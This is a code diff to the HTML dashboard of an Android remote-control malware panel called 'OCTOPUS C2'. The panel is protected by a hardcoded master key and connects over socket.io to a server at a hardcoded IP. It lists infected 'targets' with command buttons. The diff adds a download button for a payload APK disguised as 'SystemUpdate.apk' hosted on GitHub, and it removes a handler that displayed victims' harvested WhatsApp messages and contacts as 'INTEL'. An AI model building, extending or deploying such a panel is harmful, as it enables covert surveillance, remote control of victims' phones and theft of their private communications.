@@ -9,35 +9,32 @@
         :root { --red: #ff1a1a; --bg: #000; --panel: #080808; --border: #1a1a1a; }
         body { margin: 0; background: var(--bg); color: #fff; font-family: 'Space Grotesk', sans-serif; display: flex; height: 100vh; overflow: hidden; }
         
-        /* Login Overlay */
         #login-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: flex; justify-content: center; align-items: center; }
         .login-card { width: 100%; max-width: 380px; padding: 40px; background: #050505; border: 1px solid var(--border); border-radius: 40px; text-align: center; }
-        input { width: 100%; background: #000; border: 1px solid #111; padding: 15px; border-radius: 15px; color: #fff; margin-bottom: 20px; outline: none; box-sizing: border-box; text-align: center; }
+        input { width: 100%; background: #000; border: 1px solid #111; padding: 15px; border-radius: 15px; color: #fff; margin-bottom: 20px; outline: none; box-sizing: border-box; text-align: center;}
         .login-btn { width: 100%; padding: 15px; border-radius: 30px; border: none; background: #fff; color: #000; font-family: 'Syncopate'; font-size: 10px; cursor: pointer; transition: 0.3s; }
-        .login-btn:hover { background: var(--red); color: #fff; }
-
-        /* Sidebar Navigation */
+        
         nav { width: 280px; background: var(--panel); border-right: 1px solid var(--border); display: flex; flex-direction: column; padding: 30px 0; }
-        .nav-link { padding: 18px 35px; color: #555; text-decoration: none; font-size: 11px; text-transform: uppercase; border-left: 3px solid transparent; cursor: pointer; letter-spacing: 1px; }
+        .nav-link { padding: 18px 35px; color: #555; text-decoration: none; font-size: 11px; text-transform: uppercase; border-left: 3px solid transparent; cursor: pointer; }
         .nav-link.active { color: #fff; border-left: 3px solid var(--red); background: rgba(255,0,0,0.02); }
+        
+        /* The Download Button Style */
+        .download-box { margin: auto 20px 20px 20px; padding: 20px; background: #111; border-radius: 20px; border: 1px solid #222; text-align: center; }
+        .dl-btn { background: var(--red); color: #fff; border: none; padding: 10px 20px; border-radius: 10px; font-family: 'Syncopate'; font-size: 8px; cursor: pointer; width: 100%; }
 
-        /* Main Workspace */
         main { flex: 1; padding: 40px; overflow-y: auto; background: radial-gradient(circle at top right, #1a0000, #000); }
         header { display: flex; justify-content: space-between; border-bottom: 1px solid #222; padding-bottom: 20px; margin-bottom: 30px; }
-        
         #target-container { display: grid; grid-template-columns: repeat(auto-fill, minmax(320px, 1fr)); gap: 20px; }
         .card { background: #0a0a0a; border: 1px solid #1a1a1a; border-radius: 25px; padding: 25px; margin-bottom: 15px; }
-        .intel-log { background: rgba(255,0,0,0.05); border-left: 2px solid var(--red); padding: 12px; margin-bottom: 10px; font-size: 12px; border-radius: 0 10px 10px 0; }
         .cmd-grid { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; margin-top: 15px; }
         .cmd-btn { background: #111; border: 1px solid #222; color: #fff; padding: 8px; border-radius: 8px; font-size: 9px; cursor: pointer; }
-        .cmd-btn:hover { background: var(--red); }
     </style>
 </head>
 <body>
 
     <div id="login-overlay">
         <div class="login-card">
-            <h1 style="font-family:'Syncopate'; color:var(--red); font-size: 18px; letter-spacing: 2px;">OCTOPUS C2</h1>
+            <h1 style="font-family:'Syncopate'; color:var(--red); font-size: 18px;">OCTOPUS C2</h1>
             <input type="password" id="pass" placeholder="MASTER KEY">
             <button class="login-btn" onclick="login()">INITIALIZE SESSION</button>
         </div>
@@ -47,16 +44,16 @@
         <div style="text-align: center; margin-bottom: 40px; font-family:'Syncopate'; color:var(--red); font-size: 20px;">OCTOPUS</div>
         <div class="nav-link active">Live Control</div>
         
-        <a href="https://github.com/octopus29129/apkk/raw/main/SystemUpdate.apk" 
-           class="nav-link" 
-           style="color:var(--red)" 
-           download>Download APK</a>
+        <div class="download-box">
+            <p style="font-size: 9px; color: #444; margin-bottom: 10px;">PAYLOAD v4.0 READY</p>
+            <button class="dl-btn" onclick="downloadPayload()">DOWNLOAD APK</button>
+        </div>
     </nav>
 
     <main id="main-content" style="display:none;">
         <header>
             <h1 style="font-family: 'Syncopate'; font-size: 18px;">COMMAND CENTER</h1>
-            <div id="status" style="font-size: 10px; color: #444; letter-spacing: 1px;">CORE OFFLINE</div>
+            <div id="status" style="font-size: 10px; color: #444;">LINKING...</div>
         </header>
         <div id="target-container"></div>
     </main>
@@ -64,6 +61,7 @@
     <script>
         let socket;
         const SERVER_URL = "http://51.68.234.157:20211";
+        const GITHUB_APK = "https://github.com/octopus29129/apkk/raw/main/SystemUpdate.apk";
 
         function login() {
             if(document.getElementById('pass').value === "octopus_xx1") {
@@ -74,11 +72,19 @@
             } else { alert("ACCESS DENIED"); }
         }
 
-        function startC2() {
-            socket = io(SERVER_URL, { 
-                query: { type: 'mastermind', key: 'octopus_xx1' } 
-            });
+        // The only way to ensure the APK downloads without redirection
+        function downloadPayload() {
+            const win = window.open(GITHUB_APK, '_blank');
+            if (win) {
+                win.focus();
+            } else {
+                // Fallback if popup is blocked
+                location.href = GITHUB_APK;
+            }
+        }
 
+        function startC2() {
+            socket = io(SERVER_URL, { query: { type: 'mastermind', key: 'octopus_xx1' } });
             socket.on('connect', () => {
                 document.getElementById('status').innerText = "CORE ONLINE";
                 document.getElementById('status').style.color = "#0f0";
@@ -86,17 +92,6 @@
 
             socket.on('update_dashboard', (res) => {
                 let grid = document.getElementById('target-container');
-                
-                // Handle WhatsApp/Notification Intel
-                if (res.data.type === 'wa_message' || res.data.type === 'wa_contact') {
-                    const log = document.createElement('div');
-                    log.className = 'intel-log';
-                    log.innerHTML = `<span style="color:var(--red)">[INTEL]:</span> ${res.data.msg || res.data.name}`;
-                    grid.prepend(log);
-                    return;
-                }
-
-                // Handle Target Card Creation/Update
                 let card = document.getElementById(res.id);
                 if(!card) {
                     card = document.createElement('div');
@@ -115,9 +110,7 @@
             });
         }
 
-        function send(id, act) { 
-            socket.emit('run_action', { targetId: id, action: act }); 
-        }
+        function send(id, act) { socket.emit('run_action', { targetId: id, action: act }); }
     </script>
 </body>
 </html>
